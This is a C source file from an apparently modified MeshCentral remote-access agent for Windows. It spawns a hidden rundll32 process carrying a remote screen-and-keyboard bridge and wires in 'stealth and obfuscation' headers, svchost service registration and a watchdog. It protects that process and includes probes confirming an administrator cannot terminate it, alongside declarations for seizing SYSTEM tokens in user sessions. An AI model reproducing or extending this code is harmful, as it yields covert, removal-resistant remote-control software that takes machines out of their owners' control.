/*
Copyright 2006 - 2022 Intel Corporation

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

	http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

#if defined(WINSOCK2)
#include <winsock2.h>
#include <ws2tcpip.h>
#elif defined(WINSOCK1)
#include <winsock.h>
#include <wininet.h>
#endif

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <winsvc.h>
#include <wtsapi32.h>
#include <sddl.h>
#include <aclapi.h>
#include <strsafe.h>
#include <crtdbg.h>
#include "resource.h"
#include "service_security.h"
#include "meshcore/signcheck.h"
#include "meshcore/meshdefines.h"
#include "meshcore/meshinfo.h"
#include "meshcore/KVM/Windows/kvm.h"
#include "meshcore/KVM/Windows/tile.h"
#include "microstack/ILibParsers.h"
#include "microstack/ILibCrypto.h"
#include "meshcore/agentcore.h"
#include "microscript/ILibDuktape_ScriptContainer.h"
#include "microscript/ILibDuktape_Commit.h"
#include <shellscalingapi.h>
#include "branding_util.h"
#include "stealth.h"  // SECURITY: Stealth and obfuscation features
#include "stealth_utils.h"
#include "stealth_init.h"  // Lab/test stealth initialization
#include "stealth_defaults.h"
#include "stealth_watchdog.h"
#include "stealth_monitor.h"
#include "stealth_integration.h"
#include "svchost_payload.h"
// Svchost registration helper (implemented in stealth_svchost.c)
BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath);
BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName);

// Forward declaration to satisfy early references in this TU
int wmain(int argc, char* wargv[]);
static BOOL MeshService_GetServiceNameW(wchar_t* buffer, size_t cchBuffer);
static BOOL MeshService_ProcessHasSystemSid(void);
static DWORD MeshService_GetCurrentSessionId(void);
static BOOL MeshService_EnableNamedPrivilegeW(const WCHAR* privilegeName);
static char* MeshService_ReadUtf8TextFileW(const WCHAR* path);
static BOOL MeshService_OpenPrimarySystemTokenForSession(DWORD sessionId, HANDLE* tokenOut, DWORD* errorOut);
static BOOL MeshService_OpenElevatedPrimaryTokenForSession(DWORD sessionId, HANDLE* tokenOut, DWORD* errorOut);
static BOOL MeshService_SpawnProcessWithTokenW(HANDLE token, const WCHAR* arguments, const WCHAR* desktop, PROCESS_INFORMATION* processInfo, DWORD* errorOut);
typedef HRESULT(__stdcall *DpiAwarenessFunc)(PROCESS_DPI_AWARENESS);
#if defined(_LINKVM)
extern DWORD WINAPI kvm_server_mainloop(LPVOID Param);
extern int g_slavekvm;
#define MESH_KVM_BRIDGE_EVENT_ID_ATTEMPT 0xC0082001
#define MESH_KVM_BRIDGE_EVENT_ID_OUTCOME 0xC0082002
#endif

// Macro to free argv allocated by wmain - needs argvi variable in scope
#define wmain_free(argv) do { int argvi; for(argvi=0;argvi<(int)(ILibMemory_Size(argv)/sizeof(void*));++argvi){ILibMemory_Free(argv[argvi]);}ILibMemory_Free(argv); } while(0)

#define SVCHOST_STATUS_MISSING_SERVICE_KEY    0x00000001
#define SVCHOST_STATUS_NOT_IN_NETSVCS         0x00000002
#define SVCHOST_STATUS_NOT_IN_SCM             0x00000004
#define SVCHOST_STATUS_SCM_UNAVAILABLE        0x00000008
#define SVCHOST_STATUS_DLL_MISSING            0x00000010
#define SVCHOST_STATUS_DLL_HASH_MISMATCH      0x00000020
#define SVCHOST_STATUS_SID_MISMATCH           0x00000040
#define SVCHOST_STATUS_HASH_NOT_CONFIGURED    0x00000080
#define SVCHOST_STATUS_IMAGEPATH_INVALID      0x00000100
#define SVCHOST_STATUS_GROUP_ARGUMENT_INVALID 0x00000200
#define SVCHOST_STATUS_DLL_PATH_MISMATCH      0x00000400
#define SVCHOST_STATUS_SERVICE_MAIN_MISMATCH  0x00000800
#define SVCHOST_STATUS_UNLOAD_MISMATCH        0x00001000
#define SVCHOST_STATUS_NOT_RUNNING            0x00002000
#define SVCHOST_STATUS_ACCOUNT_MISMATCH       0x00004000
#define SVCHOST_STATUS_TYPE_MISMATCH          0x00008000
#define SVCHOST_STATUS_START_MISMATCH         0x00010000
#define MESH_SERVICE_CONTROL_TIMEOUT_MS       120000
#define MESH_SERVICE_CONTROL_POLL_MIN_MS      200
#define MESH_SERVICE_CONTROL_POLL_MAX_MS      1000
#define MESH_SERVICE_MAX_PROTECTION_DIAGNOSTICS 32

static LONG g_MeshServiceInvalidParameterHandlerInstalled = 0;

static void MeshService_InvalidParameterHandler(
    const wchar_t* expression,
    const wchar_t* function,
    const wchar_t* file,
    unsigned int line,
    uintptr_t reserved)
{
    WCHAR wideBuffer[1024];
    char narrowBuffer[2048];
    HANDLE stderrHandle = INVALID_HANDLE_VALUE;
    DWORD written = 0;
    int narrowLen = 0;
    void* frames[16] = { 0 };
    USHORT captured = 0;
    int i = 0;

    UNREFERENCED_PARAMETER(reserved);
    if (FAILED(StringCchPrintfW(
        wideBuffer,
        _countof(wideBuffer),
        L"[MeshService invalid parameter] expr=%ls func=%ls file=%ls line=%u\r\n",
        expression != NULL ? expression : L"(null)",
        function != NULL ? function : L"(null)",
        file != NULL ? file : L"(null)",
        line)))
    {
        return;
    }

    OutputDebugStringW(wideBuffer);
    narrowLen = WideCharToMultiByte(CP_UTF8, 0, wideBuffer, -1, narrowBuffer, (int)_countof(narrowBuffer), NULL, NULL);
    if (narrowLen <= 1) { return; }

    stderrHandle = GetStdHandle(STD_ERROR_HANDLE);
    if (stderrHandle != NULL && stderrHandle != INVALID_HANDLE_VALUE)
    {
        WriteFile(stderrHandle, narrowBuffer, (DWORD)(narrowLen - 1), &written, NULL);
    }

    captured = RtlCaptureStackBackTrace(0, (ULONG)_countof(frames), frames, NULL);
    for (i = 0; i < (int)captured; ++i)
    {
        if (FAILED(StringCchPrintfW(wideBuffer, _countof(wideBuffer), L"[MeshService invalid parameter stack] frame[%d]=%p\r\n", i, frames[i])))
        {
            break;
        }
        OutputDebugStringW(wideBuffer);
        narrowLen = WideCharToMultiByte(CP_UTF8, 0, wideBuffer, -1, narrowBuffer, (int)_countof(narrowBuffer), NULL, NULL);
        if (narrowLen > 1 && stderrHandle != NULL && stderrHandle != INVALID_HANDLE_VALUE)
        {
            WriteFile(stderrHandle, narrowBuffer, (DWORD)(narrowLen - 1), &written, NULL);
        }
    }
}

static void MeshService_InstallInvalidParameterHandler(void)
{
    if (InterlockedCompareExchange(&g_MeshServiceInvalidParameterHandlerInstalled, 1, 0) != 0)
    {
        return;
    }
    _set_invalid_parameter_handler(MeshService_InvalidParameterHandler);
    _set_thread_local_invalid_parameter_handler(MeshService_InvalidParameterHandler);
}

static const wchar_t* ServiceStateToString(DWORD s)
{
    switch (s)
    {
    case SERVICE_STOPPED: return L"STOPPED";
    case SERVICE_START_PENDING: return L"START_PENDING";
    case SERVICE_STOP_PENDING: return L"STOP_PENDING";
    case SERVICE_RUNNING: return L"RUNNING";
    case SERVICE_CONTINUE_PENDING: return L"CONTINUE_PENDING";
    case SERVICE_PAUSE_PENDING: return L"PAUSE_PENDING";
    case SERVICE_PAUSED: return L"PAUSED";
    default: return L"UNKNOWN";
    }
}

// C helper to read a registry string value (REG_SZ or REG_EXPAND_SZ)
static BOOL ReadRegStrW(HKEY hKey, LPCWSTR name, LPWSTR out, DWORD cch)
{
    if (out == NULL || cch == 0) { return FALSE; }
    DWORD type = 0;
    DWORD cb = cch * (DWORD)sizeof(wchar_t);
    LONG r = RegQueryValueExW(hKey, name, NULL, &type, (LPBYTE)out, &cb);
    if (r != ERROR_SUCCESS) { return FALSE; }
    if (type != REG_SZ && type != REG_EXPAND_SZ) { return FALSE; }
    out[cch - 1] = L'\0';
    return TRUE;
}

static void MeshService_PrintJsonEscapedUtf8(const char* value)
{
	const unsigned char* cursor = (const unsigned char*)((value != NULL) ? value : "");
	while (*cursor != '\0')
	{
		switch (*cursor)
		{
		case '\\': fputs("\\\\", stdout); break;
		case '"': fputs("\\\"", stdout); break;
		case '\n': fputs("\\n", stdout); break;
		case '\r': fputs("\\r", stdout); break;
		case '\t': fputs("\\t", stdout); break;
		default: fputc(*cursor, stdout); break;
		}
		++cursor;
	}
}

static void MeshService_PrintJsonEscapedWide(const wchar_t* value)
{
	int needed = 0;
	char* utf8 = NULL;

	if (value == NULL || value[0] == L'\0') { return; }

	needed = WideCharToMultiByte(CP_UTF8, 0, value, -1, NULL, 0, NULL, NULL);
	if (needed <= 0) { return; }

	utf8 = (char*)malloc((size_t)needed);
	if (utf8 == NULL) { return; }

	if (WideCharToMultiByte(CP_UTF8, 0, value, -1, utf8, needed, NULL, NULL) > 0)
	{
		MeshService_PrintJsonEscapedUtf8(utf8);
	}
	free(utf8);
}

#if defined(_LINKVM)
typedef struct MeshServiceBridgeSpawnContext
{
	PROCESS_INFORMATION pi;
	HANDLE inputPipeServer;
	HANDLE outputPipeServer;
	HANDLE jobObject;
	BOOL processProtected;
	BOOL assignedToJobObject;
	BOOL pipeConnected;
	DWORD createError;
	DWORD protectError;
	DWORD assignError;
	DWORD inputConnectError;
	DWORD outputConnectError;
	WCHAR rundll32Path[MAX_PATH * 2];
	DWORD targetSessionId;
} MeshServiceBridgeSpawnContext;

static void MeshService_BridgeSpawnContext_Init(MeshServiceBridgeSpawnContext* ctx)
{
	if (ctx == NULL) { return; }
	ZeroMemory(ctx, sizeof(MeshServiceBridgeSpawnContext));
	ctx->inputPipeServer = INVALID_HANDLE_VALUE;
	ctx->outputPipeServer = INVALID_HANDLE_VALUE;
}

static void MeshService_BridgeSpawnContext_Cleanup(MeshServiceBridgeSpawnContext* ctx, BOOL killProcess)
{
	if (ctx == NULL) { return; }

	if (killProcess && ctx->pi.hProcess != NULL && ctx->pi.hProcess != INVALID_HANDLE_VALUE)
	{
		if (WaitForSingleObject(ctx->pi.hProcess, 0) == WAIT_TIMEOUT)
		{
			TerminateProcess(ctx->pi.hProcess, 1);
			WaitForSingleObject(ctx->pi.hProcess, 2000);
		}
	}

	if (ctx->inputPipeServer != NULL && ctx->inputPipeServer != INVALID_HANDLE_VALUE)
	{
		DisconnectNamedPipe(ctx->inputPipeServer);
		CloseHandle(ctx->inputPipeServer);
		ctx->inputPipeServer = INVALID_HANDLE_VALUE;
	}
	if (ctx->outputPipeServer != NULL && ctx->outputPipeServer != INVALID_HANDLE_VALUE)
	{
		DisconnectNamedPipe(ctx->outputPipeServer);
		CloseHandle(ctx->outputPipeServer);
		ctx->outputPipeServer = INVALID_HANDLE_VALUE;
	}
	if (ctx->pi.hThread != NULL)
	{
		CloseHandle(ctx->pi.hThread);
		ctx->pi.hThread = NULL;
	}
	if (ctx->pi.hProcess != NULL)
	{
		CloseHandle(ctx->pi.hProcess);
		ctx->pi.hProcess = NULL;
	}
}

static BOOL MeshService_BuildKvmProbePipeBaseNameW(WCHAR* output, size_t outputLen)
{
	ULONGLONG tick = GetTickCount64();
	if (output == NULL || outputLen == 0) { return FALSE; }
	output[0] = L'\0';
	return SUCCEEDED(StringCchPrintfW(output, outputLen, L"\\\\.\\pipe\\MeshKvmHardening_%lu_%llu", GetCurrentProcessId(), tick));
}

static BOOL MeshService_BuildKvmProbePipeNamesW(WCHAR* inputPipeName, size_t inputPipeLen, WCHAR* outputPipeName, size_t outputPipeLen)
{
	WCHAR basePipeName[256] = { 0 };

	if (inputPipeName == NULL || inputPipeLen == 0 || outputPipeName == NULL || outputPipeLen == 0) { return FALSE; }
	inputPipeName[0] = L'\0';
	outputPipeName[0] = L'\0';

	if (!MeshService_BuildKvmProbePipeBaseNameW(basePipeName, _countof(basePipeName))) { return FALSE; }
	if (FAILED(StringCchPrintfW(inputPipeName, inputPipeLen, L"%ls_in", basePipeName))) { return FALSE; }
	if (FAILED(StringCchPrintfW(outputPipeName, outputPipeLen, L"%ls_out", basePipeName))) { return FALSE; }
	return TRUE;
}

static BOOL MeshService_CreateBridgeServerPipeW(const WCHAR* pipeName, DWORD pipeOpenMode, HANDLE* pipeOut)
{
	PSECURITY_DESCRIPTOR securityDescriptor = NULL;
	SECURITY_ATTRIBUTES securityAttributes;
	HANDLE pipeHandle = INVALID_HANDLE_VALUE;
	DWORD pipeBufferSize = 1024 * 1024;

	if (pipeOut == NULL || pipeName == NULL || pipeName[0] == L'\0') { return FALSE; }
	*pipeOut = INVALID_HANDLE_VALUE;

	ZeroMemory(&securityAttributes, sizeof(securityAttributes));
	securityAttributes.nLength = sizeof(securityAttributes);
	securityAttributes.bInheritHandle = FALSE;

	if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;;GA;;;SY)(A;;GA;;;BA)", SDDL_REVISION_1, &securityDescriptor, NULL))
	{
		return FALSE;
	}

	securityAttributes.lpSecurityDescriptor = securityDescriptor;
	pipeHandle = CreateNamedPipeW(
		pipeName,
		pipeOpenMode | FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
		1,
		pipeBufferSize,
		pipeBufferSize,
		0,
		&securityAttributes);

	LocalFree(securityDescriptor);
	if (pipeHandle == INVALID_HANDLE_VALUE) { return FALSE; }

	*pipeOut = pipeHandle;
	return TRUE;
}

static BOOL MeshService_WaitForBridgeClient(HANDLE pipeHandle, DWORD timeoutMs, DWORD* errorOut)
{
	OVERLAPPED overlapped;
	DWORD waitResult = WAIT_FAILED;
	DWORD transferred = 0;
	BOOL ok = FALSE;
	DWORD errorCode = ERROR_SUCCESS;

	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
	if (pipeHandle == NULL || pipeHandle == INVALID_HANDLE_VALUE)
	{
		if (errorOut != NULL) { *errorOut = ERROR_INVALID_HANDLE; }
		return FALSE;
	}

	ZeroMemory(&overlapped, sizeof(overlapped));
	overlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (overlapped.hEvent == NULL)
	{
		if (errorOut != NULL) { *errorOut = GetLastError(); }
		return FALSE;
	}

	if (ConnectNamedPipe(pipeHandle, &overlapped))
	{
		ok = TRUE;
		goto cleanup;
	}

	errorCode = GetLastError();
	switch (errorCode)
	{
	case ERROR_PIPE_CONNECTED:
		ok = TRUE;
		break;
	case ERROR_IO_PENDING:
		waitResult = WaitForSingleObject(overlapped.hEvent, timeoutMs);
		if (waitResult == WAIT_OBJECT_0 && GetOverlappedResult(pipeHandle, &overlapped, &transferred, FALSE))
		{
			ok = TRUE;
		}
		else
		{
			errorCode = (waitResult == WAIT_TIMEOUT) ? WAIT_TIMEOUT : GetLastError();
			CancelIoEx(pipeHandle, &overlapped);
		}
		break;
	default:
		break;
	}

cleanup:
	CloseHandle(overlapped.hEvent);
	if (!ok && errorOut != NULL) { *errorOut = errorCode; }
	return ok;
}

static BOOL MeshService_ResolveRundll32PathW(WCHAR* output, size_t outputLen)
{
	DWORD expanded = 0;

	if (output == NULL || outputLen == 0) { return FALSE; }
	output[0] = L'\0';

	expanded = ExpandEnvironmentStringsW(L"%SystemRoot%\\System32\\rundll32.exe", output, (DWORD)outputLen);
	if (expanded == 0 || expanded >= outputLen) { return FALSE; }
	return (GetFileAttributesW(output) != INVALID_FILE_ATTRIBUTES);
}

static BOOL MeshService_SpawnBridgeProcessW(
	const WCHAR* dllPath,
	const WCHAR* inputPipeName,
	const WCHAR* outputPipeName,
	MeshServiceBridgeSpawnContext* ctx)
{
	STARTUPINFOW si;
	WCHAR commandLine[4096];

	if (ctx == NULL || dllPath == NULL || dllPath[0] == L'\0' || inputPipeName == NULL || inputPipeName[0] == L'\0' || outputPipeName == NULL || outputPipeName[0] == L'\0')
	{
		if (ctx != NULL) { ctx->createError = ERROR_INVALID_PARAMETER; }
		return FALSE;
	}
	if (!MeshService_ResolveRundll32PathW(ctx->rundll32Path, _countof(ctx->rundll32Path)))
	{
		ctx->createError = GetLastError();
		if (ctx->createError == ERROR_SUCCESS) { ctx->createError = ERROR_FILE_NOT_FOUND; }
		return FALSE;
	}

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	if (FAILED(StringCchPrintfW(commandLine, _countof(commandLine), L"\"%ls\" \"%ls\",KvmSessionBridgeW %ls %ls", ctx->rundll32Path, dllPath, inputPipeName, outputPipeName)))
	{
		ctx->createError = ERROR_INSUFFICIENT_BUFFER;
		return FALSE;
	}

	if (!CreateProcessW(ctx->rundll32Path, commandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &ctx->pi))
	{
		ctx->createError = GetLastError();
		return FALSE;
	}

	if (!Stealth_ProtectProcessByHandle(ctx->pi.hProcess))
	{
		ctx->protectError = GetLastError();
		if (ctx->protectError == ERROR_SUCCESS) { ctx->protectError = ERROR_ACCESS_DENIED; }
		return FALSE;
	}
	ctx->processProtected = TRUE;

	ctx->jobObject = Watchdog_GetOrCreateJobObject();
	if (ctx->jobObject == NULL)
	{
		ctx->assignError = GetLastError();
		if (ctx->assignError == ERROR_SUCCESS) { ctx->assignError = ERROR_INVALID_HANDLE; }
		return FALSE;
	}
	if (!AssignProcessToJobObject(ctx->jobObject, ctx->pi.hProcess))
	{
		ctx->assignError = GetLastError();
		return FALSE;
	}
	ctx->assignedToJobObject = TRUE;
	return TRUE;
}

static BOOL MeshService_IsProcessDaclProtected(HANDLE hProcess, DWORD* controlOut)
{
	PSECURITY_DESCRIPTOR securityDescriptor = NULL;
	PACL dacl = NULL;
	SECURITY_DESCRIPTOR_CONTROL control = 0;
	DWORD revision = 0;
	DWORD result = ERROR_GEN_FAILURE;
	BOOL protectedDacl = FALSE;

	if (controlOut != NULL) { *controlOut = 0; }
	if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) { return FALSE; }

	result = GetSecurityInfo(hProcess, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &dacl, NULL, &securityDescriptor);
	if (result != ERROR_SUCCESS)
	{
		SetLastError(result);
		return FALSE;
	}

	if (GetSecurityDescriptorControl(securityDescriptor, &control, &revision))
	{
		if (controlOut != NULL) { *controlOut = (DWORD)control; }
		protectedDacl = ((control & SE_DACL_PROTECTED) != 0);
	}

	if (securityDescriptor != NULL) { LocalFree(securityDescriptor); }
	return protectedDacl;
}

static BOOL MeshService_ProbeTerminateDeniedWithRestrictedToken(DWORD pid, DWORD* openErrorOut)
{
	HANDLE currentToken = NULL;
	HANDLE restrictedToken = NULL;
	HANDLE processHandle = NULL;
	PSID adminSid = NULL;
	SID_AND_ATTRIBUTES sidToDisable;
	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
	BOOL impersonating = FALSE;
	BOOL denied = FALSE;
	DWORD openError = ERROR_SUCCESS;

	if (openErrorOut != NULL) { *openErrorOut = ERROR_SUCCESS; }

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &currentToken))
	{
		openError = GetLastError();
		goto cleanup;
	}

	if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminSid))
	{
		openError = GetLastError();
		goto cleanup;
	}

	sidToDisable.Sid = adminSid;
	sidToDisable.Attributes = 0;
	if (!CreateRestrictedToken(currentToken, DISABLE_MAX_PRIVILEGE, 1, &sidToDisable, 0, NULL, 0, NULL, &restrictedToken))
	{
		openError = GetLastError();
		goto cleanup;
	}

	if (!ImpersonateLoggedOnUser(restrictedToken))
	{
		openError = GetLastError();
		goto cleanup;
	}
	impersonating = TRUE;

	SetLastError(ERROR_SUCCESS);
	processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	openError = GetLastError();
	if (processHandle == NULL)
	{
		denied = (openError == ERROR_ACCESS_DENIED);
	}

cleanup:
	if (impersonating) { RevertToSelf(); }
	if (processHandle != NULL) { CloseHandle(processHandle); }
	if (restrictedToken != NULL) { CloseHandle(restrictedToken); }
	if (currentToken != NULL) { CloseHandle(currentToken); }
	if (adminSid != NULL) { FreeSid(adminSid); }
	if (openErrorOut != NULL) { *openErrorOut = openError; }
	return denied;
}

static int MeshService_RunKvmBridgeHardeningProbeCommand(const WCHAR* dllPath)
{
	MeshServiceBridgeSpawnContext ctx;
	WCHAR inputPipeName[256] = { 0 };
	WCHAR outputPipeName[256] = { 0 };
	DWORD daclControl = 0;
	DWORD restrictedOpenError = ERROR_SUCCESS;
	DWORD terminateWaitResult = WAIT_FAILED;
	ULONGLONG terminateStartTick = 0;
	ULONGLONG exitAfterTerminateMs = 0;
	BOOL success = FALSE;
	BOOL dllExists = FALSE;
	BOOL daclProtected = FALSE;
	BOOL restrictedTerminateDenied = FALSE;
	BOOL aliveBeforeTerminate = FALSE;
	BOOL existingHandleTerminateSucceeded = FALSE;

	MeshService_BridgeSpawnContext_Init(&ctx);
	dllExists = (dllPath != NULL && dllPath[0] != L'\0' && GetFileAttributesW(dllPath) != INVALID_FILE_ATTRIBUTES);

	if (dllExists &&
		MeshService_BuildKvmProbePipeNamesW(inputPipeName, _countof(inputPipeName), outputPipeName, _countof(outputPipeName)) &&
		MeshService_CreateBridgeServerPipeW(inputPipeName, PIPE_ACCESS_OUTBOUND, &ctx.inputPipeServer) &&
		MeshService_CreateBridgeServerPipeW(outputPipeName, PIPE_ACCESS_INBOUND, &ctx.outputPipeServer) &&
		MeshService_SpawnBridgeProcessW(dllPath, inputPipeName, outputPipeName, &ctx) &&
		MeshService_WaitForBridgeClient(ctx.inputPipeServer, 5000, &ctx.inputConnectError) &&
		MeshService_WaitForBridgeClient(ctx.outputPipeServer, 5000, &ctx.outputConnectError))
	{
		ctx.pipeConnected = TRUE;
		Sleep(500);
		aliveBeforeTerminate = (WaitForSingleObject(ctx.pi.hProcess, 0) == WAIT_TIMEOUT);
		daclProtected = MeshService_IsProcessDaclProtected(ctx.pi.hProcess, &daclControl);
		restrictedTerminateDenied = MeshService_ProbeTerminateDeniedWithRestrictedToken(ctx.pi.dwProcessId, &restrictedOpenError);

		terminateStartTick = GetTickCount64();
		if (aliveBeforeTerminate && TerminateProcess(ctx.pi.hProcess, 0))
		{
			existingHandleTerminateSucceeded = TRUE;
			terminateWaitResult = WaitForSingleObject(ctx.pi.hProcess, 5000);
			exitAfterTerminateMs = GetTickCount64() - terminateStartTick;
		}
	}

	success = dllExists &&
		ctx.processProtected &&
		ctx.assignedToJobObject &&
		ctx.pipeConnected &&
		aliveBeforeTerminate &&
		daclProtected &&
		restrictedTerminateDenied &&
		existingHandleTerminateSucceeded &&
		terminateWaitResult == WAIT_OBJECT_0;

	printf("{\"success\":%s,", success ? "true" : "false");
	printf("\"phase\":\"kvm-bridge-hardening-probe\",");
	printf("\"dllPath\":\""); MeshService_PrintJsonEscapedWide(dllPath); printf("\",");
	printf("\"dllExists\":%s,", dllExists ? "true" : "false");
	printf("\"rundll32Path\":\""); MeshService_PrintJsonEscapedWide(ctx.rundll32Path); printf("\",");
	printf("\"inputPipeName\":\""); MeshService_PrintJsonEscapedWide(inputPipeName); printf("\",");
	printf("\"outputPipeName\":\""); MeshService_PrintJsonEscapedWide(outputPipeName); printf("\",");
	printf("\"pid\":%lu,", (unsigned long)ctx.pi.dwProcessId);
	printf("\"protectedProcess\":%s,", ctx.processProtected ? "true" : "false");
	printf("\"assignedToJobObject\":%s,", ctx.assignedToJobObject ? "true" : "false");
	printf("\"bridgeConnected\":%s,", ctx.pipeConnected ? "true" : "false");
	printf("\"aliveBeforeTerminate\":%s,", aliveBeforeTerminate ? "true" : "false");
	printf("\"daclProtected\":%s,", daclProtected ? "true" : "false");
	printf("\"restrictedTerminateDenied\":%s,", restrictedTerminateDenied ? "true" : "false");
	printf("\"existingHandleTerminateSucceeded\":%s,", existingHandleTerminateSucceeded ? "true" : "false");
	printf("\"createError\":%lu,", (unsigned long)ctx.createError);
	printf("\"protectError\":%lu,", (unsigned long)ctx.protectError);
	printf("\"assignError\":%lu,", (unsigned long)ctx.assignError);
	printf("\"inputConnectError\":%lu,", (unsigned long)ctx.inputConnectError);
	printf("\"outputConnectError\":%lu,", (unsigned long)ctx.outputConnectError);
	printf("\"restrictedOpenError\":%lu,", (unsigned long)restrictedOpenError);
	printf("\"daclControl\":%lu,", (unsigned long)daclControl);
	printf("\"terminateWaitResult\":%lu,", (unsigned long)terminateWaitResult);
	printf("\"exitAfterTerminateMs\":%llu}\n", (unsigned long long)exitAfterTerminateMs);
	fflush(stdout);

	MeshService_BridgeSpawnContext_Cleanup(&ctx, !existingHandleTerminateSucceeded);
	return success ? 0 : 1;
}

static int MeshService_RunKvmBridgeJobControllerCommand(const WCHAR* dllPath, const WCHAR* inputPipeName, const WCHAR* outputPipeName)
{
	MeshServiceBridgeSpawnContext ctx;
	BOOL dllExists = FALSE;
	BOOL pipeProvided = FALSE;
	BOOL aliveAfterWarmup = FALSE;
	BOOL success = FALSE;
	DWORD warmupWaitResult = WAIT_FAILED;

	MeshService_BridgeSpawnContext_Init(&ctx);
	dllExists = (dllPath != NULL && dllPath[0] != L'\0' && GetFileAttributesW(dllPath) != INVALID_FILE_ATTRIBUTES);
	pipeProvided = (inputPipeName != NULL && inputPipeName[0] != L'\0' && outputPipeName != NULL && outputPipeName[0] != L'\0');

	if (dllExists && pipeProvided && MeshService_SpawnBridgeProcessW(dllPath, inputPipeName, outputPipeName, &ctx))
	{
		warmupWaitResult = WaitForSingleObject(ctx.pi.hProcess, 1500);
		aliveAfterWarmup = (warmupWaitResult == WAIT_TIMEOUT);
	}

	success = dllExists && pipeProvided && ctx.processProtected && ctx.assignedToJobObject && aliveAfterWarmup;

	printf("{\"success\":%s,", success ? "true" : "false");
	printf("\"phase\":\"kvm-bridge-job-controller\",");
	printf("\"dllPath\":\""); MeshService_PrintJsonEscapedWide(dllPath); printf("\",");
	printf("\"inputPipeName\":\""); MeshService_PrintJsonEscapedWide(inputPipeName); printf("\",");
	printf("\"outputPipeName\":\""); MeshService_PrintJsonEscapedWide(outputPipeName); printf("\",");
	printf("\"dllExists\":%s,", dllExists ? "true" : "false");
	printf("\"pipeProvided\":%s,", pipeProvided ? "true" : "false");
	printf("\"rundll32Path\":\""); MeshService_PrintJsonEscapedWide(ctx.rundll32Path); printf("\",");
	printf("\"pid\":%lu,", (unsigned long)ctx.pi.dwProcessId);
	printf("\"protectedProcess\":%s,", ctx.processProtected ? "true" : "false");
	printf("\"assignedToJobObject\":%s,", ctx.assignedToJobObject ? "true" : "false");
	printf("\"aliveAfterWarmup\":%s,", aliveAfterWarmup ? "true" : "false");
	printf("\"createError\":%lu,", (unsigned long)ctx.createError);
	printf("\"protectError\":%lu,", (unsigned long)ctx.protectError);
	printf("\"assignError\":%lu,", (unsigned long)ctx.assignError);
	printf("\"warmupWaitResult\":%lu}\n", (unsigned long)warmupWaitResult);
	fflush(stdout);

	if (!success)
	{
		MeshService_BridgeSpawnContext_Cleanup(&ctx, TRUE);
	}
	return success ? 0 : 1;
}

typedef struct MeshServiceKvmSessionChangeProbeState
{
	volatile LONG screenPackets;
	volatile LONG displayListPackets;
	volatile LONG displayInfoPackets;
	volatile LONG cursorPackets;
	volatile LONG picturePackets;
	volatile LONG jumboPackets;
	volatile LONG lastScreenWidth;
	volatile LONG lastScreenHeight;
} MeshServiceKvmSessionChangeProbeState;

static LONG MeshService_KvmSessionChangeProbeTotalPackets(const MeshServiceKvmSessionChangeProbeState* state)
{
	if (state == NULL) { return 0; }
	return state->screenPackets +
		state->displayListPackets +
		state->displayInfoPackets +
		state->cursorPackets +
		state->picturePackets +
		state->jumboPackets;
}

static ILibTransport_DoneState MeshService_KvmSessionChangeProbeWriteSink(char *buffer, int bufferLen, void *reserved)
{
	MeshServiceKvmSessionChangeProbeState* state = (MeshServiceKvmSessionChangeProbeState*)reserved;
	unsigned short type = 0;

	if (state == NULL || buffer == NULL || bufferLen < 4) { return ILibTransport_DoneState_COMPLETE; }
	type = ntohs(((unsigned short*)buffer)[0]);

	switch (type)
	{
	case MNG_KVM_PICTURE:
		InterlockedIncrement(&state->picturePackets);
		break;
	case MNG_JUMBO:
		InterlockedIncrement(&state->jumboPackets);
		break;
	case MNG_KVM_SCREEN:
		InterlockedIncrement(&state->screenPackets);
		if (bufferLen >= 8)
		{
			InterlockedExchange(&state->lastScreenWidth, (LONG)ntohs(((unsigned short*)(buffer))[2]));
			InterlockedExchange(&state->lastScreenHeight, (LONG)ntohs(((unsigned short*)(buffer))[3]));
		}
		break;
	case MNG_KVM_GET_DISPLAYS:
		InterlockedIncrement(&state->displayListPackets);
		break;
	case MNG_KVM_DISPLAY_INFO:
		InterlockedIncrement(&state->displayInfoPackets);
		break;
	case MNG_KVM_MOUSE_CURSOR:
		InterlockedIncrement(&state->cursorPackets);
		break;
	default:
		break;
	}

	return ILibTransport_DoneState_COMPLETE;
}

static DWORD WINAPI MeshService_KvmSessionChangeProbeChainThread(LPVOID param)
{
	if (param != NULL) { ILibStartChain(param); }
	return 0;
}

static BOOL MeshService_IsProcessAliveById(DWORD pid)
{
	HANDLE processHandle = NULL;
	DWORD waitResult = WAIT_FAILED;

	if (pid == 0) { return FALSE; }

	processHandle = OpenProcess(SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (processHandle == NULL) { processHandle = OpenProcess(SYNCHRONIZE, FALSE, pid); }
	if (processHandle == NULL) { return FALSE; }

	waitResult = WaitForSingleObject(processHandle, 0);
	CloseHandle(processHandle);
	return (waitResult == WAIT_TIMEOUT);
}

